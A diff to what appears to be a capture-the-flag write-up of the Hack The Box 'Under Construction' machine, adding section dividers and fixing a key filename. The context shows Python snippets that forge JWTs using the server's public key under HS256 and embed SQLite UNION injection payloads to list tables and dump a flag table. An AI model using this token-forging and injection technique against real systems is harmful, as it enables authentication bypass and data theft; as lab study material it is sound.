@@ -22,6 +22,8 @@ The *Hack The Box Labs: Under Construction* challenge machine, rated *medium*, p
 - A copy of the source code for inspection
 
 Two vulnerabilities were identified in the source code that, when combined, allow for a full database dump from the live server.
+
+---
 ## Flaw 1: SQL Injection
 ### Database
 
@@ -139,6 +141,8 @@ This function is used during the authentication process in `routes/index.js` in 
 ### Summary
 
 One potential SQL Injection vector was found where the username stored in the JWT token could potentially be manipulated if tokens can be forged.
+
+---
 ## Flaw 2: Session token manipulation
 ### JWT session tokens
 
@@ -228,6 +232,8 @@ user notarealuser doesn't exist in our database.
 #### Summary
 
 Using `HS256` and the accessible public key, a valid token can be forged.
+
+---
 ## Exploit:
 
 The two vulnerabilities can be exploited in tandem: a valid JWT token can be forged containing a `username` parameter that exploits the SQL injection vulnerability.
@@ -240,7 +246,7 @@ A simple UNION based SQLite3 injection attack can query `sqlite_master` for vali
 ```python
 import jwt
 
-key = open("public2.key").read()
+key = open("public.key").read()
 payload = {
   "username": "' UNION SELECT NULL,name,NULL FROM sqlite_master WHERE type='table'  --",
   "iat": 1709484391
@@ -262,7 +268,7 @@ A second UNION based SQLite3 injection query can be used to dump `flag_storage`:
 ```python
 import jwt
 
-key = open("public2.key").read()
+key = open("public.key").read()
 payload = {
   "username": "' UNION SELECT *,NULL FROM flag_storage  --",
   "iat": 1709484391
